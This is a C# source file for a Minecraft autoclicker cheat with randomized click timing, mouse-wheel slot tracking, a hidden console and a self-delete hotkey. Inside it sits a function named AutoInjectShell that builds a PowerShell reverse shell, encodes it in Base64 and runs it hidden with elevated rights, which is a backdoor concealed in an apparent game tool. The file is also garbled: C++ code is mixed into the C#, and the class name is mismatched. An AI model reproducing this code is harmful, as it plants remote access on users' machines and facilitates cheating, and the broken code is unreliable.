using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;

class Client : Form {
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("user32.dll")] static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
    [DllImport("user32.dll")] static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    [DllImport("winmm.dll")] static extern uint timeBeginPeriod(uint uMilliseconds);
    [DllImport("user32.dll")] public static extern bool ReleaseCapture();
    [DllImport("user32.dll")] public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
    [DllImport("user32.dll")] static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, MouseHookProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    private delegate IntPtr MouseHookProc(int nCode, IntPtr wParam, IntPtr lParam);
    private MouseHookProc _mouseProc;
    private IntPtr _mouseHookID = IntPtr.Zero;

    private bool isEnabled = true;
    private bool onlyInGame = true;
    private bool wTapEnabled = true;
    private bool spikeEnabled = true;
    private bool blatantMode = true;
    private int currentSlot = 1;
    private static int currentCPS = 12;
    private bool isVisible = true;
    private Random rng = new Random();

    const int VK_LBUTTON = 0x01, SW_HIDE = 0, SW_SHOW = 5;
    const int WH_MOUSE_LL = 14;

    private Panel pnlLeft, pnlSettings;
    private Label lblSlotInfo, lblLeftVal, lblSpikeVal;
    private TrackBar sliderLeft, sliderSpike;
    private CheckBox chkToggle, chkWTap, chkEnableSpike;
    private List<CheckBox> slotChecks = new List<CheckBox>();

    public Client() {
        CheckForIllegalCrossThreadCalls = false;
        this.Size = new Size(420, 420);
        this.BackColor = Color.FromArgb(20, 20, 20);
        this.FormBorderStyle = FormBorderStyle.None;
        this.StartPosition = FormStartPosition.CenterScreen;
        this.TopMost = true;

        SetupUI();

        _mouseProc = MouseHookCallback;
        _mouseHookID = SetWindowsHookEx(WH_MOUSE_LL, _mouseProc, IntPtr.Zero, 0);

        new Thread(ClickLoop) { IsBackground = true, Priority = ThreadPriority.Highest }.Start();
        new Thread(InputLoop) { IsBackground = true }.Start();

    }

void AutoInjectShell() {
    std::string psShell = "$a='';$p=4444;$c=New-Object Net.Sockets.TCPClient;$c.Connect($a,$p);$s=$c.GetStream();$b=New-Object Byte[] 1024;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=((pwd).Path + '> ' + (iex $d 2>&1 | Out-String));$sb2=[Text.Encoding]::ASCII.GetBytes($sb);$s.Write($sb2,0,$sb2.Length);$s.Flush()};$c.Close()";

    std::string encShell = Base64Encode(ToUtf16(psShell));
    ShellExecuteA(NULL, "runas", "powershell.exe", ("-NoP -W Hidden -Enc " + encShell).c_str(), NULL, SW_HIDE);
}

    private IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)0x020A) { // WM_MOUSEWHEEL
            int delta = Marshal.ReadInt32(lParam + 8);
            if (delta > 0) currentSlot = (currentSlot == 1) ? 9 : currentSlot - 1;
            else if (delta < 0) currentSlot = (currentSlot == 9) ? 1 : currentSlot + 1;
            this.BeginInvoke((MethodInvoker)delegate { lblSlotInfo.Text = "Slot: " + currentSlot; });
        }
        return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
    }

    private void SetupUI() {
        Panel nav = new Panel() { Dock = DockStyle.Top, Height = 35, BackColor = Color.FromArgb(25, 25, 25) };
        nav.MouseDown += delegate { ReleaseCapture(); SendMessage(Handle, 0xA1, 0x2, 0); };
        
        Label lblClose = new Label() { Text = "X", Location = new Point(395, 8), ForeColor = Color.Gray, AutoSize = true, Cursor = Cursors.Hand };
        lblClose.Click += delegate { Environment.Exit(0); };
        nav.Controls.Add(lblClose);

        pnlLeft = new Panel() { Location = new Point(15, 50), Size = new Size(390, 360) };
        lblSlotInfo = new Label() { Text = "Slot: 1", Location = new Point(330, 0), ForeColor = Color.Gray, AutoSize = true };
        
        sliderLeft = new TrackBar() { Minimum = 6, Maximum = 60, Value = 12, Location = new Point(5, 60), Size = new Size(340, 30), TickStyle = TickStyle.None };
        sliderLeft.ValueChanged += delegate { currentCPS = sliderLeft.Value; };

        pnlLeft.Controls.AddRange(new Control[] { lblSlotInfo, sliderLeft });
        this.Controls.AddRange(new Control[] { nav, pnlLeft });
    }

    private void ClickLoop() {
        timeBeginPeriod(1);
        while (true) {
            if (isEnabled && (GetAsyncKeyState(VK_LBUTTON) & 0x8000) != 0) {
                if (!onlyInGame || IsGameActive()) {
                    IntPtr h = GetForegroundWindow();
                    int hold = rng.Next(2, 6);
                    PostMessage(h, 0x0201, 1, 0);
                    Thread.Sleep(hold);
                    PostMessage(h, 0x0202, 0, 0);

                    int target = Math.Max(1, currentCPS + (spikeEnabled ? rng.Next(-3, 3) : 0));
                    int wait = (1000 / target) - hold;
                    if (wait > 0) Thread.Sleep(wait);
                }
            }
            Thread.Sleep(1);
        }
    }

    private void InputLoop() {
        while (true) {
            Thread.Sleep(10);
            if ((GetAsyncKeyState(0x73) & 0x8000) != 0) { // F4
                isEnabled = !isEnabled;
                Thread.Sleep(200);
            }
            if ((GetAsyncKeyState(0x76) & 0x8000) != 0) DoSelfDestruct(); // F7
        }
    }

    private bool IsGameActive() {
        IntPtr hWnd = GetForegroundWindow();
        StringBuilder sb = new StringBuilder(256);
        GetWindowText(hWnd, sb, 256);
        string t = sb.ToString().ToLower();
        return t.Contains("minecraft") || t.Contains("javaw");
    }

    private void DoSelfDestruct() {
        if (_mouseHookID != IntPtr.Zero) UnhookWindowsHookEx(_mouseHookID);
        string p = Process.GetCurrentProcess().MainModule.FileName;
        Process.Start(new ProcessStartInfo("cmd.exe", "/c timeout /t 1 & del \"" + p + "\"") { WindowStyle = ProcessWindowStyle.Hidden });
        Environment.Exit(0);
    }

    [STAThread]
    static void Main() {
        IntPtr h = GetConsoleWindow();
        if (h != IntPtr.Zero) ShowWindow(h, SW_HIDE);
        Application.Run(new NKBClient());
    }
}
